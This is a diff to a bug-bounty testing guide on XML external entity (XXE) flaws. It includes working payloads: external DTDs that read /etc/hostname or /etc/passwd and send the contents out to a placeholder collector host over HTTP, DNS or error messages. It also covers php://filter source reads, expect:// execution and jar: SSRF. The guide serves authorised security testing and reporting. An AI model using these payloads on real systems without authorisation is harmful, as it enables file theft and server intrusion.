@@ -50,23 +50,37 @@ curl -sk -X POST "https://$H/api/import" -H 'Content-Type: application/xml' --da
 ```
 
 ```xml
-<!-- e.dtd, hosted on your collector - exfiltrates via the DNS/HTTP label -->
+<!-- e.dtd, hosted on your collector - the content leaves in the HTTP query string,
+     so this needs outbound HTTP from the target to you -->
 <!ENTITY % f SYSTEM "file:///etc/hostname">
 <!ENTITY % w "<!ENTITY &#37; send SYSTEM 'http://xxe.COLLECTOR/?d=%f;'>">
 %w; %send;
 ```
 
+If the target resolves DNS but cannot reach you over HTTP, move the content into the hostname
+instead - `<!ENTITY % send SYSTEM 'http://%f;.xxe.COLLECTOR/'>` - and read it out of your
+authoritative log. Only label-safe content survives that: single line, no spaces, 63 bytes per
+label, so it is `/etc/hostname`-sized proof and nothing longer.
+
 A DNS or HTTP hit for `e.dtd` alone already proves external entity resolution. That is a
 confirmed XXE; the exfiltration step only demonstrates the impact, and one small file is enough.
 
-For files with newlines (which break URLs), use the error-based variant - the parser puts the
-content in the error message:
+For files with newlines (which break URLs), try the error-based variant - the parser puts the
+content into the exception text:
 
 ```xml
 <!ENTITY % f SYSTEM "file:///etc/passwd">
 <!ENTITY % e "<!ENTITY &#37; err SYSTEM 'file:///nonexistent/%f;'>">
 %e; %err;
 ```
+
+This is not a general fallback: it only works where the processor embeds the unresolvable system
+identifier in its exception **and** the app returns that exception to you - typical of
+Java/Xerces with verbose errors, rare when errors are generic or when libxml (PHP, Python) is the
+parser. Both declarations must live in the external DTD, not the internal subset. When the errors
+come back generic, fall back to a single-line file (`/etc/hostname`) or, on PHP, wrap the read in
+`php://filter/convert.base64-encode/resource=…` so the content is newline-free base64 - a quiet
+target is not a patched one.
 
 **4. SVG and Office documents** - the same bug wearing a friendly extension.
 
@@ -82,7 +96,11 @@ Rendered to PNG server-side, the file content appears **in the image**. For DOCX
 inject the DOCTYPE into `word/document.xml` or `xl/workbook.xml`, rezip, upload.
 
 **5. Other XML impacts.** XXE is not only file read: `http://` entities give you SSRF (go to
-`zp-ssrf`), and on PHP with `expect://` or Java with `jar://` it can reach execution.
+`zp-ssrf`); on PHP `expect://id` reaches execution, but only where the PECL expect extension is
+loaded, which is rare. On the JVM the scheme is `jar:` with one colon and an inner URL -
+`jar:http://xxe.COLLECTOR/x.zip!/f` - and it is **not** execution: it gives SSRF plus a
+controlled temp-file write (an upload primitive on its own, and a DoS vector). Call it that in
+the report; "RCE via jar:" is the overclaim a triager rejects.
 **Never send a billion-laughs / quadratic-blowup payload** - that is a denial of service and it
 is excluded by essentially every program.
 
@@ -156,7 +174,7 @@ the target.
 | DTD fetched from your collector | **confirmed XXE** even with no data returned |
 | error message containing file content | confirmed blind XXE via the error channel |
 | SVG renders with file content visible | confirmed, and a beautiful screenshot |
-| `php://filter` returns base64 of app source | confirmed, Critical - source and secrets exposed |
+| `php://filter` returns base64 of app source | confirmed, High - arbitrary source disclosure (CVSS 7.5, `AV:N/AC:L/PR:N/UI:N/C:H`). Argue Critical only if the one proof file demonstrably holds a live secret granting further access - and redact it |
 | traversal returns the *same* file regardless of depth | probably a normalised path. Killed |
 | 500 on `../` | inconclusive - many frameworks reject any `..`. Keep going up the ladder |
 | only files inside the intended directory are readable | not traversal. Killed |
